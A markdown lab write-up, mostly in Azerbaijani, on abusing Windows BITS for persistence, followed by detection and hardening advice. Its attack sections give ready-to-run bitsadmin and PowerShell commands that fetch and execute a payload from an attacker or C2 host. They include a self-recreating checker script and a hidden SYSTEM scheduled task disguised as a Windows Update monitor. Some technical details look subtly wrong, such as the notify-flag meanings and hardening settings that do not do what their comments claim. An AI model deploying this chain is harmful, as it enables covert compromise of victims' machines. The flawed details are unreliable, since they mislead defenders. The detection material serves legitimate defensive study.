```markdown
# Task 4: Persistence Using BITSAdmin

## 1. Introduction

### Overview of BITS and Its Role in Windows
Background Intelligent Transfer Service (BITS), Windows əməliyyat sistemində fayl transferi üçün nəzərdə tutulmuş xidmətdir. Əsasən Windows Update, Microsoft Defender yeniləmələri və digər sistem komponentləri tərəfindən istifadə olunur. BITS-in əsas xüsusiyyətləri:

- **Asinxron transfer**: Faylları arxa planda, istifadəçiyə mane olmadan yükləyir
- **Şəbəkə adaptasiyası**: Şəbəkə trafikini dinamik olaraq tənzimləyir
- **Dayanıqlılıq**: Bağlantı kəsildikdə avtomatik bərpa
- **Prioritet sistemi**: Transferləri prioritetə görə sıralayır
- **Sistem rebootuna dözümlülük**: Kompüter yenidən başladıldıqda belə aktiv qalır

### How Attackers Abuse BITS for Persistence
Təhlükəsizlik tədqiqatçıları və zərərli proqram müəllifləri BITS-i aşağıdakı səbəblərə görə sui-istifadə edirlər:

1. **Qanuni sistem komponenti**: Windows-un etibarlı komponenti olduğu üçün antivirus proqramları nadir hallarda bloklayır
2. **Persistence**: Sistem rebootundan sonra belə aktiv qalır
3. **Stealth**: Transfer tarixçəsi Event Log-larda görünsə də, execution indikatorları məhduddur
4. **SYSTEM konteksti**: BITS xidməti SYSTEM hüquqları ilə işləyir
5. **Scheduled Tasks ilə kombinasiya**: Daha mürəkkəb persistence mexanizmləri yaradıla bilər

## 2. Understanding BITS and Its Capabilities

### How BITS Functions in Windows
BITS xidməti Windows-da aşağıdakı komponentlərdən ibarətdir:

```
[Application Layer]
    ↓
[BitsAdmin.exe / PowerShell BITS cmdlets]
    ↓
[BITS Service (qmgr.dll)]
    ↓
[BITS Job Manager]
    ↓
[HTTP(S) / SMB / UNC Protocol Handlers]
    ↓
[Network Layer]
```

**Əsas BITS komponentləri:**
- **qmgr.dll**: BITS Manager - bütün job-ları idarə edir
- **bitsadmin.exe**: Command-line utility
- **PowerShell cmdlets**: `Start-BitsTransfer`, `Get-BitsTransfer`, `Resume-BitsTransfer`
- **Event Log**: `Microsoft-Windows-Bits-Client/Operational`

### Why Attackers Prefer BITS for Covert Operations
BITS-in hücumçular tərəfindən seçilmə səbəbləri:

1. **Low and Slow yanaşması**: Trafik ani deyil, hissə-hissə edilir - IDS/IPS-dən yayınma
2. **Trusted Binary**: bitsadmin.exe Microsoft tərəfindən imzalanıb
3. **AppLocker bypass**: İmzalanmış binary olduğu üçün AppLocker qaydalarından keçə bilər
4. **Job persistence**: `/SETNOTIFYFLAGS` ilə job tamamlananda yenidən başlatma
5. **Network tolerance**: Şəbəkə kəsilsə belə job deaktiv olmur

## 3. Creating a Malicious BITS Job

### Step-by-Step Guide

#### Addım 1: Target maşına daxil olmaq
```powershell
# Windows-a administrator hüquqları ilə daxil olun
# BITS xidmətinin aktiv olduğunu yoxlayın
Get-Service BITS
```

#### Addım 2: Mövcud BITS job-larını yoxlamaq
```cmd
# Bütün BITS job-larını siyahıla
bitsadmin /list /allusers

# Xüsusi job-un statusunu yoxla
bitsadmin /list /allusers /verbose
```

```powershell
# PowerShell alternativi
Get-BitsTransfer -AllUsers
```

#### Addım 3: Payload üçün web server hazırlığı
```bash
# Kali Linux-da (hücumçu maşın)
# Python HTTP server qurun
cd /path/to/payload
python3 -m http.server 8080

# Və ya Apache/Nginx istifadə edin
# reverse_shell.exe faylını host edin
```

#### Addım 4: Yeni BITS job-u yaratmaq
```cmd
# Job yaradılması - Download işi
bitsadmin /create /download MaliciousUpdate

# URL təyin etmə
bitsadmin /addfile MaliciousUpdate http://192.168.1.100:8080/payload.exe C:\Windows\Temp\update.exe

# Prioritet təyin etmə (FOREGROUND - ən yüksək)
bitsadmin /setpriority MaliciousUpdate FOREGROUND

# Job-u aktivləşdirmə
bitsadmin /resume MaliciousUpdate

# Status yoxlama
bitsadmin /info MaliciousUpdate /verbose
```

#### Addım 5: Execute mexanizmi əlavə etmək
```cmd
# Job tamamlandıqda execute ediləcək əmri təyin etmə
bitsadmin /setnotifycmdline MaliciousUpdate cmd.exe "/c C:\Windows\Temp\update.exe"
bitsadmin /setnotifyflags MaliciousUpdate 4

# Notify flags:
# 1 - Job transferred
# 2 - Job error
# 3 - Job modified  
# 4 - Job transferred | error
```

#### Addım 6: Persistence üçün konfiqurasiya
```powershell
# PowerShell ilə BITS job yaradılması (daha təhlükəsiz metod)
$job = Start-BitsTransfer `
    -Source "http://c2-server.com/payload.exe" `
    -Destination "C:\ProgramData\Microsoft\Windows\update_cache.exe" `
    -Asynchronous `
    -Priority High `
    -RetryInterval 60 `
    -RetryTimeout 120

# Job-a completion command əlavə etmək
# Qeyd: Bu PowerShell cmdlet-lərlə mümkün deyil, bitsadmin tələb olunur
```

### Advanced BITS Job Configuration
```cmd
:: İnkişaf etmiş BITS job konfiqurasiyası
bitsadmin /create /download UpdateService
bitsadmin /addfile UpdateService https://legitimate-looking-domain.com/update.cab C:\ProgramData\winupdate.exe

:: Retry konfiqurasiyası
bitsadmin /setminretrydelay UpdateService 60
bitsadmin /setnoprogresstimeout UpdateService 120

:: Custom HTTP headers (legitimate görünmək üçün)
bitsadmin /setcustomheaders UpdateService "User-Agent: Windows-Update-Agent/10.0"
bitsadmin /setcustomheaders UpdateService "Accept: */*"

:: Proxy bypass
bitsadmin /setproxysettings UpdateService OVERRIDE ""

:: Authentication (əgər target daxili şəbəkədədirsə)
bitsadmin /setcredentials UpdateService TARGET_DOMAIN USERNAME PASSWORD

:: Execute on complete
bitsadmin /setnotifycmdline UpdateService "%COMSPEC%" "/c start /b C:\ProgramData\winupdate.exe"
bitsadmin /setnotifyflags UpdateService 4

:: Resume job
bitsadmin /resume UpdateService
```

## 4. Implementing a Persistence Mechanism

### PowerShell Checker Script
Aşağıdakı skript BITS job-unun davamlılığını təmin edir:

```powershell
# BITS_Persistence_Checker.ps1
# Bu skript BITS job-unun aktivliyini yoxlayır və lazım olduqda yenidən yaradır

param(
    [string]$JobName = "UpdateService",
    [string]$PayloadURL = "https://legitimate-domain.com/update.cab",
    [string]$DestinationPath = "C:\ProgramData\winupdate.exe",
    [string]$CommandLine = "cmd.exe /c start /b C:\ProgramData\winupdate.exe",
    [string]$LogPath = "C:\ProgramData\Microsoft\Windows\bits_checker.log"
)

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $LogPath -Append
    Write-Host $Message
}

function Check-BITSJob {
    param([string]$JobName)
    
    try {
        # BITS job-unu yoxla
        $job = Get-BitsTransfer -Name $JobName -ErrorAction Stop
        $jobStatus = $job.JobState
        
        Write-Log "BITS Job '$JobName' status: $jobStatus"
        
        switch ($jobStatus) {
            "Transferred" {
                # Job tamamlanıb - execute edildiyini yoxla
                if (Test-Path $DestinationPath) {
                    Write-Log "Payload file exists. Checking if process is running..."
                    $processRunning = Get-Process | Where-Object { $_.Path -eq $DestinationPath }
                    if (-not $processRunning) {
                        Write-Log "Process not running. Executing payload..."
                        Start-Process -FilePath $DestinationPath -WindowStyle Hidden
                    }
                }
                
                # Job-u yenidən başlat (növbəti persistence üçün)
                Remove-BitsTransfer -Name $JobName -Confirm:$false
                Create-BITSJob
            }
            "Error" {
                Write-Log "Job error detected. Recreating..."
                Remove-BitsTransfer -Name $JobName -Confirm:$false
                Create-BITSJob
            }
            "Connecting", "Transferring", "Queued" {
                Write-Log "Job is active. No action needed."
            }
            default {
                Write-Log "Unknown state: $jobStatus. Recreating job..."
                Create-BITSJob
            }
        }
    }
    catch {
        Write-Log "Job not found or error: $_. Creating new job..."
        Create-BITSJob
    }
}

function Create-BITSJob {
    param()
    
    try {
        Write-Log "Creating BITS job: $JobName"
        
        # BITSAdmin ilə yeni job yaratmaq
        $createCmd = "bitsadmin /create /download $JobName"
        $addFileCmd = "bitsadmin /addfile $JobName $PayloadURL $DestinationPath"
        $notifyCmd = "bitsadmin /setnotifycmdline $JobName `"$CommandLine`""
        $notifyFlags = "bitsadmin /setnotifyflags $JobName 4"
        $resumeCmd = "bitsadmin /resume $JobName"
        
        cmd.exe /c $createCmd | Out-Null
        cmd.exe /c $addFileCmd | Out-Null
        cmd.exe /c $notifyCmd | Out-Null
        cmd.exe /c $notifyFlags | Out-Null
        cmd.exe /c $resumeCmd | Out-Null
        
        Write-Log "BITS job created successfully"
        
        # Alternativ olaraq PowerShell ilə
        # Start-BitsTransfer -Source $PayloadURL -Destination $DestinationPath -Asynchronous -DisplayName $JobName
        
        return $true
    }
    catch {
        Write-Log "Failed to create BITS job: $_"
        return $false
    }
}

function Monitor-JobIntegrity {
    param()
    
    # Registry-də BITS job qalıqlarını yoxla
    $bitsRegistry = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\BITS\StateIndex"
    if (Test-Path $bitsRegistry) {
        Write-Log "BITS state index exists"
    }
    
    # Event Log yoxlaması
    $bitsEvents = Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 50 | 
                  Where-Object { $_.Message -match $JobName }
    
    if ($bitsEvents) {
        Write-Log "Found $($bitsEvents.Count) related BITS events in logs"
    }
}

# Əsas execution loop
Write-Log "=== BITS Persistence Checker Started ==="

# Tək execution üçün
Check-BITSJob -JobName $JobName
Monitor-JobIntegrity

# Davamlı monitoring üçün (Scheduled Task ilə)
# while ($true) {
#     Check-BITSJob -JobName $JobName
#     Start-Sleep -Seconds 300  # 5 dəqiqədən bir yoxla
# }
```

### Scheduled Task Integration
BITS job-unu davamlı monitoring üçün Scheduled Task yaradaq:

```powershell
# Scheduled Task yaradılması
$action = New-ScheduledTaskAction `
    -Execute "PowerShell.exe" `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\ProgramData\Microsoft\Windows\BITS_Persistence_Checker.ps1`""

$trigger = New-ScheduledTaskTrigger `
    -AtStartup `
    -RepetitionInterval (New-TimeSpan -Minutes 10) `
    -RepetitionDuration (New-TimeSpan -Days 365)

$principal = New-ScheduledTaskPrincipal `
    -UserId "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -Hidden

Register-ScheduledTask `
    -TaskName "Windows Update Service Monitor" `
    -Action $action `
    -Trigger $trigger `
    -Principal $principal `
    -Settings $settings `
    -Description "Monitors Windows Update components and ensures continuous operation" `
    -Force

# Task-ı aktivləşdirmə
Start-ScheduledTask -TaskName "Windows Update Service Monitor"
```

### VSS Persistence (Alternativ metod)
```powershell
# Volume Shadow Copy ilə backup persistence
# Əgər əsas fayl silinsə, VSS-dən bərpa et

$checkerScript = @'
# BITS Job Recovery from VSS
$vssPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\ProgramData\winupdate.exe"
if (-not (Test-Path "C:\ProgramData\winupdate.exe")) {
    if (Test-Path $vssPath) {
        Copy-Item $vssPath "C:\ProgramData\winupdate.exe" -Force
        Start-Process "C:\ProgramData\winupdate.exe" -WindowStyle Hidden
    }
}
'@
```

## 5. Detecting and Preventing Malicious BITS Jobs

### Detection Methods

#### Windows Event Log Analysis
BITS aktivliyini event log-lardan analiz etmək:

```powershell
# BITS Event Log-u yoxlamaq
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 1000 |
    Where-Object {
        $_.Id -in @(3, 4, 59, 60, 164, 165)
    } |
    Select-Object TimeCreated, Id, Message |
    Format-List

# Event ID təsvirləri:
# 3  - Job yaradıldı
# 4  - Job-a fayl əlavə edildi  
# 59 - Job transfer başladı
# 60 - Job transfer tamamlandı
# 164 - Job yenidən başladıldı
# 165 - Job konfiqurasiyası dəyişdirildi

# Şübhəli BITS joblarını aşkarlama
$suspiciousEvents = Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 5000 |
    Where-Object {
        $_.Id -eq 3 -and
        ($_.Message -match "cmd.exe" -or 
         $_.Message -match "powershell.exe" -or
         $_.Message -match "\.exe" -or
         $_.Message -match "temp|tmp|appdata|programdata")
    }

if ($suspiciousEvents) {
    Write-Warning "Suspicious BITS jobs detected!"
    $suspiciousEvents | Format-Table TimeCreated, Id, Message -AutoSize
}
```

#### PowerShell Detection Script
```powershell
# BITS_Detection.ps1
function Get-SuspiciousBITSJobs {
    $suspicious = @()
    
    # Bütün BITS job-larını əldə et
    $allJobs = bitsadmin /list /allusers /verbose | Select-String -Pattern "GUID|DISPLAY|NOTIFY|URL|LOCAL"
    
    # BITS transfer-ləri yoxla
    $transfers = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue
    
    foreach ($transfer in $transfers) {
        $jobCheck = @{
            JobName = $transfer.DisplayName
            JobState = $transfer.JobState
            FileList = $transfer.FileList
            Suspicious = $false
            Reasons = @()
        }
        
        # Şübhəli göstəricilər
        if ($transfer.DisplayName -notmatch "^(Windows|Microsoft|Update|Defender)") {
            $jobCheck.Suspicious = $true
            $jobCheck.Reasons += "Unusual job name"
        }
        
        foreach ($file in $transfer.FileList) {
            if ($file.LocalName -match "(?i)(temp|tmp|appdata|public|downloads|desktop)") {
                $jobCheck.Suspicious = $true
                $jobCheck.Reasons += "Download to suspicious directory: $($file.LocalName)"
            }
            
            if ($file.RemoteName -notmatch "^https?://(update\.microsoft|.*\.windows\.com|.*\.microsoft\.com)") {
                $jobCheck.Suspicious = $true
                $jobCheck.Reasons += "Suspicious remote URL: $($file.RemoteName)"
            }
        }
        
        # Notify command yoxla
        $jobInfo = bitsadmin /info $transfer.JobId /verbose | Select-String "NOTIFY COMMAND"
        if ($jobInfo -match "(cmd|powershell|wscript|cscript|rundll32|regsvr32)") {
            $jobCheck.Suspicious = $true
            $jobCheck.Reasons += "Suspicious notify command"
        }
        
        if ($jobCheck.Suspicious) {
            $suspicious += $jobCheck
        }
    }
    
    return $suspicious
}

# Detection execution
$suspiciousJobs = Get-SuspiciousBITSJobs
if ($suspiciousJobs.Count -gt 0) {
    Write-Host "[!] Suspicious BITS jobs found: $($suspiciousJobs.Count)" -ForegroundColor Red
    $suspiciousJobs | Format-List
} else {
    Write-Host "[+] No suspicious BITS jobs detected" -ForegroundColor Green
}
```

### Prevention and Hardening

#### 1. Group Policy Configuration
```powershell
# BITS-i məhdudlaşdırma üçün Group Policy
# Registry açarı:
$bitsPolicy = @"
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\BITS]
"EnableBitsMaxBandwidth"=dword:00000001
"MaxBandwidthValidFrom"=dword:00000000
"MaxBandwidthValidTo"=dword:00000000
"MaxTransferRateOnSchedule"=dword:00000000
"MaxTransferRateOffSchedule"=dword:00000000

; BITS job-larını yalnız SYSTEM hesabı ilə məhdudlaşdır
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\BITS\Client]
"EnableBITSMaxBandwidth"=dword:00000001
"MaxDownloadTime"=dword:00015180
"MaxNotificationTimeout"=dword:00015180
"@
```

#### 2. Windows Defender Firewall Rules
```powershell
# BITS üçün firewall qaydaları
New-NetFirewallRule `
    -DisplayName "Restrict BITS Traffic" `
    -Direction Outbound `
    -Program "%SystemRoot%\System32\bitsadmin.exe" `
    -Action Block `
    -Profile Any

# Yalnız Windows Update üçün BITS-ə icazə
New-NetFirewallRule `
    -DisplayName "Allow BITS for Windows Update" `
    -Direction Outbound `
    -Program "%SystemRoot%\System32\bitsadmin.exe" `
    -RemoteAddress "*.windows.com","*.microsoft.com" `
    -Action Allow `
    -Profile Any
```

#### 3. AppLocker Policy
```xml
<!-- AppLocker qaydası - BITSAdmin istifadəsini məhdudlaşdır -->
<RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePublisherRule 
        Id="BITS_ADMIN_RESTRICT" 
        Name="Restrict BITSAdmin to Administrators"
        Description="Only allow administrators to use bitsadmin.exe"
        UserOrGroupSid="S-1-5-32-544" 
        Action="Allow">
        <Conditions>
            <FilePublisherCondition 
                PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US"
                ProductName="MICROSOFT® WINDOWS® OPERATING SYSTEM"
                BinaryName="BITSADMIN.EXE">
                <BinaryVersionRange LowSection="*" HighSection="*" />
            </FilePublisherCondition>
        </Conditions>
    </FilePublisherRule>
</RuleCollection>
```

#### 4. Monitoring with Sysmon
```xml
<!-- Sysmon konfiqurasiyası - BITS monitoring -->
<Sysmon schemaversion="4.22">
    <EventFiltering>
        <!-- BITS Event Log monitoring -->
        <RuleGroup name="BITS Activity" groupRelation="or">
            <ProcessCreate onmatch="include">
                <CommandLine condition="contains">bitsadmin</CommandLine>
            </ProcessCreate>
            <ProcessCreate onmatch="include">
                <CommandLine condition="contains">Start-BitsTransfer</CommandLine>
            </ProcessCreate>
            <ProcessCreate onmatch="include">
                <CommandLine condition="contains">Get-BitsTransfer</CommandLine>
            </ProcessCreate>
        </RuleGroup>
        
        <!-- Notify command execution -->
        <RuleGroup name="BITS Notify Commands" groupRelation="or">
            <ProcessCreate onmatch="include">
                <ParentImage condition="end with">bitsadmin.exe</ParentImage>
            </ProcessCreate>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```

## 6. Conclusion

### Summary of the Attack Method
BITS (Background Intelligent Transfer Service) persistence texnikası Windows sistemlərində aşağıdakı üstünlükləri təmin edir:

1. **Qanuni Windows xidməti**: Sistem tərəfindən etibarlı komponent kimi qəbul edilir
2. **Yüksək imtiyazlar**: SYSTEM səviyyəsində işləyir
3. **Davamlılıq**: Reboot-lar arasında da aktiv qalır
4. **Stealth**: Trafik hissə-hissə ötürüldüyü üçün şəbəkə monitorinqindən yayına bilir
5. **Sadə implementasiya**: Command-line vasitəsilə asanlıqla yaradıla bilər

### Best Practices for Defense and Mitigation

#### Monitoring
- BITS event log-larını mütəmadi analiz edin (Event ID 3,4,59,60,164)
- Şübhəli URL-lərə ünvanlanan BITS job-larını yoxlayın
- Gözlənilməz notify komandaları araşdırın
- BITS job yaradılması üçün SIEM qaydaları qurun

#### Prevention
- BITS istifadəsini AppLocker ilə məhdudlaşdırın
- Yalnız Windows Update serverlərinə BITS trafikinə icazə verin
- Qeyri-adi BITS job yaradılması üçün alert mexanizmləri qurun
- Sistem fayl bütövlüyünü mütəmadi yoxlayın (SFC)

#### Incident Response
- Şübhəli BITS job-larını dərhal dayandırın: `bitsadmin /cancel <job_name>`
- Event log-larda araşdırma aparın
- Registry-də BITS qalıqlarını yoxlayın
- Payload-un icra olunub-olunmadığını müəyyən edin

BITS persistence texnikası, qanuni sistem funksionallığını sui-istifadə etdiyi üçün xüsusilə təhlükəlidir. Effektiv müdafiə üçün çoxqatlı yanaşma tətbiq edilməli, davamlı monitoring aparılmalı və ən kiçik şübhəli aktivlik belə araşdırılmalıdır.
```
